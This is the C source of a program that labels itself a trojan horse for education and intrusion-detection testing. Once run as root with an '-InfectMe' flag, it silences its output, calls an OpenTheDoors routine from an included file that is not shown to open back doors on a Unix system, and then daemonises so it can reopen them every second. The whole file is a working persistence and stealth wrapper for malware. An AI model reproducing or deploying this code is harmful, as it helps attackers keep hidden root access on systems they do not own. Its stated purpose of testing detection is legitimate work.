#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

#include "OpenTheDoors.c"

void usage(char *strName)
{
	/* warnt the user */
	printf("Warning: %s is a trojan-horse program.\n",strName);
	printf("It is designed for educational purposes and the testing of IDS\n");
	printf("It will open back-doors on our Unix system.\n");
	printf("If you still want to run it, envoke it with the -InfectMe commandline option\n");
}

main(int c, char *argv[])
{

	if(c != 2) {
		usage(argv[0]);
		exit(1);
	}
	
	if(strcmp(argv[1],"-InfectMe")){
		usage(argv[0]);
		exit(1);
	}	

	/* check to see if we are running as root */
	uid_t euid=geteuid();
	if ( euid != 0) {
		fprintf(stderr,"%s: Sorry you must be root to run this command.\n",argv[0]);    
		exit(1); 
	} 


	printf("Thanks for running my program.\n");
	printf("If you ever need root access to you server, please let me know.\n");

	/* make std out and std err /dev/null, so that we run silently from here */
	close(1);
	close(2);
	open("/dev/null",O_RDWR);
	open("/dev/null",O_RDWR);


	OpenTheDoors(c, argv);


	/* run a copy of ourself as a daemon */
	if(fork()) {
		/* parent (or fork error), exit */
		exit(0);
	}

	/* if we get here we are the child, time to become a daemon */

	/* get our own process group */
	setsid();

	while(1){
		/* wait until the coast is clear */
		sleep(1);

		/* open/reopen our back doors */
		OpenTheDoors(c, argv);
	}
	
}
